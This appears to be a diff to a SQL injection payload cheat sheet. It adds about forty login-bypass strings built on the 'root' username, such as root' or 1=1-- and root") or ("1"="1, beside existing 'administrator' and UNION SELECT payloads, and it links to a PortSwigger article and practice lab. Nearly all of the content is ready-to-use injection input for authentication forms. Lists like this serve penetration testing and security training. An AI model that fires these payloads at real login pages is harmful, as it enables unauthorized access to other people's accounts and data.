@@ -182,6 +182,46 @@ administrator") or "1"="1"--
 administrator") or "1"="1"#
 administrator") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
+root" #
+root" --
+root" or "1"="1
+root" or "1"="1"#
+root" or "1"="1"--
+root" or "1"="1"/*
+root" or 1=1
+root" or 1=1 or ""="
+root" or 1=1#
+root" or 1=1--
+root" or 1=1/*
+root") or "1"="1
+root") or "1"="1"#
+root") or "1"="1"--
+root") or "1"="1"/*
+root") or ("1"="1
+root") or ("1"="1"#
+root") or ("1"="1"--
+root") or ("1"="1"/*
+root"/*
+root' #
+root' --
+root' or '1'='1
+root' or '1'='1'#
+root' or '1'='1'--
+root' or '1'='1'/*
+root' or 1=1
+root' or 1=1#
+root' or 1=1--
+root' or 1=1/*
+root') or '1'='1
+root') or '1'='1'#
+root') or '1'='1'--
+root') or '1'='1'/*
+root') or ('1'='1
+root') or ('1'='1'#
+root') or ('1'='1'--
+root') or ('1'='1'/*
+root'/*
+root'or 1=1 or ''='
 ```
 - [How to bypass login authentication (Article)](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
 - [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
